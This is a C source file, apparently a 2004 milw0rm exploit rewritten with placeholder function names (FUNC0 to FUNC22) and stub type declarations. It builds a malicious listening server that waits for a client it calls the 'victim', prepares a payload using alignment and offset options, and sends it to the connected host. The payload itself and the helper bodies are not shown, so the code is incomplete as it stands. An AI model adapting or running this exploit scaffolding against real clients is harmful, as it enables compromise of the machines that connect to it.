#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  victim ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  confess ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 unsigned int ALIGN ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 unsigned int OFFSET ; 
 unsigned int PORT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_REUSEADDR ; 
 int SUCCESS ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (int,struct sockaddr*,unsigned int*) ; 
 unsigned int FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,...) ; 
 unsigned int FUNC9 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (unsigned int) ; 
 char* FUNC12 (TYPE_1__) ; 
 int FUNC13 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  payload ; 
 int FUNC16 (int,unsigned int,unsigned int) ; 
 int FUNC17 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC18 (char*,unsigned int) ; 
 int FUNC19 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,unsigned int*,int) ; 
 int /*<<< orphan*/  FUNC20 (int) ; 
 int FUNC21 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 

int
FUNC22(int argc, char **argv)
{
unsigned int align = 0, offset = 0, reuse = 1;
unsigned int port = PORT;
unsigned int cl_buf, opts;

signed int clisock_fd, sock_fd;

static char *exploit, *work;

struct sockaddr_in victim;
struct sockaddr_in confess;


if(argc < 2) {
FUNC3();
FUNC7(exploit);
FUNC0(1);
}FUNC3();


while((opts = FUNC9(argc, argv, "a:o:")) != -1) {
switch(opts)
{
case 'a':
align = FUNC2(optarg);
break;
case 'o':
offset = FUNC2(optarg);
break;
default:
align = ALIGN;
offset = OFFSET;
}
}

if((sock_fd = FUNC21(AF_INET, SOCK_STREAM, 0)) == -1) {
FUNC6("Could not create socket");
}

if(FUNC19(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, sizeof(int)) == -1) {
FUNC6("Could not re-use socket");
}

FUNC15(&confess, 0, sizeof(confess));

confess.sin_family = AF_INET;
confess.sin_port = FUNC11(port);
confess.sin_addr.s_addr = FUNC10(INADDR_ANY);

if(FUNC4(sock_fd, (struct sockaddr *)&confess, sizeof(struct sockaddr)) == -1) {
FUNC6("Could not bind socket");
}

if(FUNC13(sock_fd, 0) == -1) {
FUNC6("Could not listen on socket");
}

FUNC18(" -> Listening for a connection on port %d\n", port);

cl_buf = sizeof(victim);
clisock_fd = FUNC1(sock_fd, (struct sockaddr *)&victim, &cl_buf);

FUNC8(stderr, " -> Action: Attaching from host[%s]\n", FUNC12(victim.sin_addr));

if(FUNC16(clisock_fd, align, offset) == 1) {
FUNC8(stderr, "Could not prep package\n");
FUNC0(1);
}

if(FUNC17(clisock_fd, payload) == 1) {
FUNC8(stderr, "Could not send package\n");
FUNC0(1);
}
FUNC20(2);

FUNC8(stderr, " -> Test complete\n\n");

FUNC5(clisock_fd); FUNC14(work);

return SUCCESS;
}


// milw0rm.com [2004-07-04]